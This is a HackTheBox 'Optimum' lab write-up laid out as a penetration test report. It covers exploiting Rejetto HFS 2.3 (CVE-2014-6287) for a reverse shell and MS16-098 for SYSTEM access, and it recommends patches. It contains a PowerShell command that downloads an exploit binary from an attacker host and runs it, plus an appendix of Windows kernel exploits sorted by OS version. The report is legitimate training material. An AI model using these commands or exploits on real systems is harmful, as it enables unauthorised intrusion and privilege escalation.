# HTB Optimum - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2025-12-12

---

## 0. Lesson Learned

Each Windows version has a small cluster of kernel vulnerabilities associated with it. You will likely need to search Google many times to find them all (or check the Appendix).

---

## 1. Executive Summary

A penetration test was conducted against the **HTB Optimum** Windows host. Enumeration identified and exposed **Rejetto HTTP File Server 2.3** instance vulnerable to remote code execution. This provided and initial shell as the user *kostas*. Privilege escalation was achieved by exploiting a missing Microsoft kernel patch (**MS16-098**) on **Windows Server 2012 R2 Build 9600**, resulting in full SYSTEM-level compromise.

---

## 2. Scope

- **Target:** 10.129.13.67
- **Environment:** HackTheBox Optimum (Retired Machine)
- **Testing Window:** 2025-12-9 to 2025-12-11
- **Objective:** Obtain user-level and root-level access

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Vulnerability Analysis
- Exploitation
- Privilege Escalation
- Post-Exploitation

---

## 4. Discovery & Enumeration

### Port Scan

A full TCP Nmap scan revealed a single exposed service on TCP/80 running **HttpFileServer 2.3**:

```
nmap -p- -sCV 10.129.13.67 -T4 -oA optimum_initial
```

UDP scan returned no actionable results.

### Web Enumeration

Browsing the root page showed the default HFS interface with no authentication required. A Gobuster scan did not identify useful directories.

---

## 5. Exploitation

### Vulnerability Identification

Research in to HFS 2.3 revealed multiple public exploits. After testing newer SSTI-based exploits unsuccessfully, a reliable RCE PoC was located for **CVE-2014-6287** (Rejetto HFS 2.3 RCE).

### Execution

The **CVE-2014-6287 Rejetto HFS 2.3 RCE exploit** was edited to include local host and listening port.

Running the exploit:

```
python3 exploit.py 10.129.13.67 80
```

A reverse shell was received as `OPTIMUM\kostas`.

---

## 6. Privilege Escalation

### System Enumeration

Systeminfo revealed:

- **OS:** Windows Server 2012 R2 Standard
- **Build:** 6.3.9600
- **Architecture:** x64
- **Hotfix count:** 31 installed
- **User:** kostas

Initial checks (privileges, services, file searches) did not reveal misconfigurations.

### Kernel Vulnerability Analysis

Tools such as *Windows-Exploit-Suggester* returned not valid results due to database mismatch issues.

Manual OS-version analysis identified the host as potentially vulnerable to **MS16-098**, a well-known Windows 8.1 / Server 2012 R2 kernel logical flaw (TrackPopupMenuEx vulnerability).

### Exploit Deployment

The MS16-098 exploit by SensePost was cloned:

```
git clone https://github.com/sensepost/ms16-098
```

The exploit required uploading **bfill.exe** to the target. This was done using PowerShell:

```
PowerShell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.7:80/bfill.exe','C:\Users\Public\Downloads\bfill.exe')"
```

Execution:

```
C:\Users\Public\Downloads\bfill.exe
```

Resulting in elevation to `NT AUTHORITY\SYSTEM`.

---

## 7. Post-Exploitation

**User Flag**: *REDACTED*

```
type C:\Users\kostas\Desktop\user.txt
```

**Root Flag**: *REDACTED*

```
type C:\Users\Administrator\Desktop\root.txt
```

---

## 8. Key Vulnerabilities Identified

| Vulnerability | Severity | Description | Impact |
|---------------|----------|-------------|--------|
| Rejetto HTTP File Server 2.3 RCE | Critical | An insecure function in Rejetto HTTP File Server allows remote attackers to execute arbitrary programs | Remote Code Execution |
| MS16-098 Windows Kernel Exploit | High | Kernel mode driver GDI object abuse enabling privilege escalation | Root Access |

---

## 9. Remediation Recommendations

- Apply missing Microsoft security updates including **MS16-098**.
- Review and apply all outstanding updates for Windows Server 2012 R2.
- Replace or isolate **HFS 2.3**, which is deprecated and vulnerable. 
- Restrict HTTP exposure to only necessary interfaces.
- Enforce application allowlisting to prevent arbitrary binary execution.
- Remove legacy tools such as `cmd.exe` exposure for service accounts.

---

## 10. Conclusion

The HTB Optimum host was fully compromised through a publicly known remote code execution vulnerability in HFS 2.3, followed by successful kernel-level privilege escalation via MS16-098. Proper patching and removal of unsupported software would have prevented both the foothold and full system compromise.

---

## 11. Appendix

### Exploits Used

[CVE-2014-6287 Rejetto HTTP File Server 2.3 RCE](https://github.com/rahisec/rejetto-http-file-server-2.3.x-RCE-exploit-CVE-2014-6287)

[MS16-098 Windows Kernel Exploit](https://github.com/sensepost/ms16-098)

### Windows Kernel Exploit Clusters

#### Windows XP / Server 2003 (NT 5.x)

- **MS08-067**
- **MS09-050**
- **MS10-015**
- **MS11-080**

#### Windows 7 / Server 2008 R2 (NT 6.1)

- **MS11-046** - afd.sys
- **MS13-053** - win32k.sys
- **MS13-081** - win32k.sys
- **MS14-058** - win32k.sys (shared with 2012 R2)
- **MS15-051** - common across several OSes
- **MS16-034** - win32k elevation
- **MS10-092** - Task Scheduler (if schtasks is broken)

#### Windows 8.1 / Server 2012 R2 (NT 6.3)

- **MS14-058** - win32k.sys
- **MS15-051** - win32k.sys
- **MS16-032** - Secondary Logon
- **MS16-098** - TrackPopupMenuEx logical flaw
- **MS10-092** - Task Scheduler (still occasionally pops)

#### Windows 10 (1507-1511) / Server 2016 Early Builds

- **MS16-032** - still affects early Win10
- **MS16-135** - win32k
- **CVE-2016-7255** - win32k
- **CVE-2017-0143 (EternalRomance / MS17-010)** - rarely used for privesc, but still possible sideways movement
- **CVE-2016-0099** - secondary logon LPE

#### Windows 10 Modern Builds / Server 2019

- Misconfigured services
- Weak ACLs
- Credential exposure
- Unquoted paths
- Scheduled tasks
- Registry permissions
- AlwaysInstallElevated
- Token abuse
- DLL hijacking
- Password reuse
- GPP leftovers